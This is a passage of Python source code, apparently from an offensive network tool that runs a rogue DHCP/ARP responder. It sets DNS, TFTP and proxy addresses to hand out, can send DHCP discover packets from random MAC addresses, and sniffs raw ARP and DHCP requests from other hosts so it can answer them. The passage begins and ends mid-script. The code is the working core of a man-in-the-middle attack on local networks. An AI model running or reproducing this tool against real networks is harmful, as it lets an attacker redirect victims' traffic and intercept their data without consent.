            base.print_info('DNS server IP address: ', dns_server_ip_address)
            base.print_info('TFTP server IP address: ', tftp_server_ip_address)

            if args.proxy is not None:
                base.print_info('Proxy url: ', args.proxy)
        # endregion

        # region Add ip addresses in list with free ip addresses from first to last offer IP
        if target_ip_address is None:
            base.print_info('Create list with free IP addresses in your network ...')
            get_free_ip_addresses()
        # endregion

        # region Send DHCP discover packets in the background thread
        if args.send_discover:
            base.print_info('Start DHCP discover packets send in the background thread ...')

            if args.discover_rand_mac:
                dhcp_discover_packets_source_mac = eth.make_random_mac()
                base.print_info('DHCP discover packets Ethernet source MAC: ', dhcp_discover_packets_source_mac,
                                ' (random MAC address)')
            else:
                dhcp_discover_packets_source_mac = your_mac_address
                base.print_info('DHCP discover packets Ethernet source MAC: ', dhcp_discover_packets_source_mac,
                                ' (your MAC address)')

            base.print_info('Delay between DHCP discover packets: ', str(args.discover_delay))
            discover_sender_is_work = True
            tm.add_task(discover_sender)
        # endregion

        # region Sniff network

        # region Create RAW socket for sniffing
        listen_raw_socket = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
        # endregion

        # region Print info message
        base.print_info('Waiting for a ARP or DHCP requests ...')
        # endregion

        # region Start sniffing
        while True:

            # region Try
            try:

                # region Sniff packets from RAW socket
                packets = listen_raw_socket.recvfrom(2048)

                for packet in packets:

                    # region Parse Ethernet header
                    ethernet_header = packet[0:eth.header_length]
                    ethernet_header_dict = eth.parse_header(ethernet_header)
                    # endregion

                    # region Could not parse Ethernet header - break
                    if ethernet_header_dict is None:
                        break
                    # endregion

                    # region Ethernet filter
                    if target_mac_address is not None:
                        if ethernet_header_dict['source'] != target_mac_address:
                            break
                    else:
                        if ethernet_header_dict['source'] == your_mac_address:
                            break
                        if dhcp_discover_packets_source_mac is not None:
                            if ethernet_header_dict['source'] == dhcp_discover_packets_source_mac:
                                break
                    # endregion

                    # region ARP packet

                    # 2054 - Type of ARP packet (0x0806)
                    if ethernet_header_dict['type'] == arp.packet_type:

                        # region Parse ARP packet
                        arp_header = packet[eth.header_length:eth.header_length + arp.packet_length]
                        arp_packet_dict = arp.parse_packet(arp_header)
                        # endregion

                        # region Could not parse ARP packet - break
                        if arp_packet_dict is None:
                            break
                        # endregion

                        # region ARP filter
                        if arp_packet_dict['opcode'] != 1:
                            break
                        # endregion

                        # region Call function with full ARP packet
                        reply({
                            'Ethernet': ethernet_header_dict,
                            'ARP': arp_packet_dict
                        })
                        # endregion

                    # endregion

                    # region IP packet

                    # 2048 - Type of IP packet (0x0800)
                    if ethernet_header_dict['type'] == ip.header_type:

                        # region Parse IP header
                        ip_header = packet[eth.header_length:]
                        ip_header_dict = ip.parse_header(ip_header)
                        # endregion

                        # region Could not parse IP header - break
                        if ip_header_dict is None:
                            break
                        # endregion

                        # region UDP
                        if ip_header_dict['protocol'] == udp.header_type:

                            # region Parse UDP header
                            udp_header_offset = eth.header_length + (ip_header_dict['length'] * 4)
                            udp_header = packet[udp_header_offset:udp_header_offset + udp.header_length]
                            udp_header_dict = udp.parse_header(udp_header)
                            # endregion

                            # region Could not parse UDP header - break
                            if udp_header is None:
                                break
                            # endregion

                            # region DHCP packet

                            if udp_header_dict['destination-port'] == 67 and udp_header_dict['source-port'] == 68:

                                # region Parse DHCP packet
                                dhcp_packet_offset = udp_header_offset + udp.header_length
                                dhcp_packet = packet[dhcp_packet_offset:]
                                dhcp_packet_dict = dhcp.parse_packet(dhcp_packet)
                                # endregion

                                # region Could not parse DHCP packet - break
                                if dhcp_packet_dict is None:
                                    break
                                # endregion

                                # region Call function with full DHCP packet
                                full_dhcp_packet = {
                                    'Ethernet': ethernet_header_dict,
                                    'IP': ip_header_dict,
                                    'UDP': udp_header_dict
                                }
                                full_dhcp_packet.update(dhcp_packet_dict)

                                reply(full_dhcp_packet)
                                # endregion

                            # endregion

                        # endregion

                    # endregion

                # endregion

            # endregion

            # region Exception - KeyboardInterrupt
            except KeyboardInterrupt:
                base.print_info('Exit')
                exit(0)
            # endregion

        # endregion

        # endregion

    except KeyboardInterrupt:
        base.print_info('Exit')
        exit(0)

    except AssertionError as Error:
        base.print_error(Error.args[0])
        exit(1)

# endregion
